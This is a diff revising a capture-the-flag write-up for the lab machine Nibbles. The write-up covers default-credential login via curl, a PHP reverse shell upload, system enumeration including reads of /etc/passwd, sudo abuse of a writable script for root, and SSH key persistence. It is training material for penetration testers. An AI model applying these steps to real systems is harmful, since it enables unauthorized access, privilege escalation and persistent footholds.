@@ -413,7 +413,7 @@ It's time to upload our `revshell.php` file. However, to do so, we need a
 
 ```sh
 ❯ RESPONSE=$(curl -s -i "http://10.10.10.75/nibbleblog/admin.php?controller=user&action=login" -X "POST" --data-urlencode "username=admin" --data-urlencode "password=nibbles"); \
-    PHPSESSID=$(echo "$RESPONSE" | grep -oP "Set-Cookie: PHPSESSID=\K[^;]+")
+  PHPSESSID=$(echo "$RESPONSE" | grep -oP "Set-Cookie: PHPSESSID=\K[^;]+")
 ```
 
 With this value, we can upload our PHP file.
@@ -438,15 +438,13 @@ nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
 
 It caught the reverse shell!
 
-### Stabilizing the shell
+### Spawning a tty & establishing persistence
 
-Usually I would use SSH to stabilize the shell, but for some reason SSH gives an
-extremely limited shell, so I'll use this one-liner to stabilize a bit the shell
-by spawning a tty:
+Let's use SSH to spawn a tty and to establish persistence.
 
-```sh
-script "/dev/null" -qc "/bin/bash"
-```
+Our home folder doesn't contain a `.ssh` folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+`authorized_keys`. Finally, I'll connect over SSH to Nibbles as `nibbler`.
 
 ## Getting a lay of the land
 
@@ -457,7 +455,7 @@ If we run `whoami`, we see that we got a foothold as `nibbler`.
 What is Nibbles's architecture?
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ uname -m
+nibbler@Nibbles:~$ uname -m
 ```
 
 ```
@@ -471,7 +469,7 @@ It's using x86_64. Let's keep that in mind to select the appropriate binaries.
 Let's see which distribution Nibbles is using.
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat "/etc/lsb-release"
+nibbler@Nibbles:~$ cat "/etc/lsb-release"
 ```
 
 ```
@@ -488,7 +486,7 @@ Okay, so it's Ubuntu 16.04.
 Let's find the kernel version of Nibbles.
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ uname -r
+nibbler@Nibbles:~$ uname -r
 ```
 
 ```
@@ -502,7 +500,7 @@ It's `4.4.0`.
 Let's enumerate all users.
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ grep ".*sh$" "/etc/passwd" | cut -d ":" -f "1" | sort
+nibbler@Nibbles:~$ grep ".*sh$" "/etc/passwd" | cut -d ":" -f "1" | sort
 ```
 
 ```
@@ -516,7 +514,7 @@ There's only `root`.
 Let's enumerate all groups.
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat "/etc/group" | cut -d ":" -f "1" | sort
+nibbler@Nibbles:~$ cat "/etc/group" | cut -d ":" -f "1" | sort
 ```
 
 ```
@@ -587,7 +585,7 @@ The `lxd` group is interesting to elevate privileges.
 Let's gather the list of connected NICs.
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ifconfig
+nibbler@Nibbles:~$ ifconfig
 ```
 
 ```
@@ -618,7 +616,7 @@ There's an Ethernet interface and the loopback interface.
 What is Nibbles's hostname?
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ hostname
+nibbler@Nibbles:~$ hostname
 ```
 
 ```
@@ -634,7 +632,7 @@ Yeah I know, very surprising.
 If we check our home folder, we find the user flag.
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat "/home/nibbler/user.txt"
+nibbler@Nibbles:~$ cat "/home/nibbler/user.txt"
 ```
 
 ```
@@ -650,7 +648,7 @@ If we explore our home folder, we notice a `personal.zip` file.
 Let's get the content of this mysterious file:
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ unzip -l "/home/nibbler/personal.zip"
+nibbler@Nibbles:~$ unzip -l "/home/nibbler/personal.zip"
 ```
 
 ```
@@ -667,7 +665,7 @@ Archive:  /home/nibbler/personal.zip
 Okay, so it contains a `monitor.sh` file. Let's unzip it now:
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ unzip "/home/nibbler/personal.zip" -d "/tmp"
+nibbler@Nibbles:~$ unzip "/home/nibbler/personal.zip" -d "/tmp"
 ```
 
 ```
@@ -713,7 +711,7 @@ it means that it has special permissions somehow.
 Let's see if we can execute anything as another user with `sudo`.
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
+nibbler@Nibbles:~$ sudo -l
 ```
 
 ```
@@ -756,22 +754,23 @@ Let's abuse our `sudo` permissions to execute the
 `/home/nibbler/personal/stuff/monitor.sh` file as `root`:
 
 ```sh
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo "/home/nibbler/personal/stuff/monitor.sh"
+nibbler@Nibbles:~$ sudo "/home/nibbler/personal/stuff/monitor.sh"
 ```
 
 ```
 <SNIP>
-root@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image#
+root@Nibbles:~#
 ```
 
 Yay!
 
-### Stabilizing the shell
+### Establishing persistence
+
+Let's use SSH to establish persistence.
 
 Our home folder doesn't contain a `.ssh` folder, so I'll create one. Then I'll
-create a private key and I'll add the corresponding key to `authorized_keys`.
-Finally I'll connect over SSH to Nibbles. This way, I'll have a much more stable
-shell.
+create a private key, and I'll add the corresponding public key to
+`authorized_keys`. Finally, I'll connect over SSH to Nibbles as `root`.
 
 ## System enumeration
 
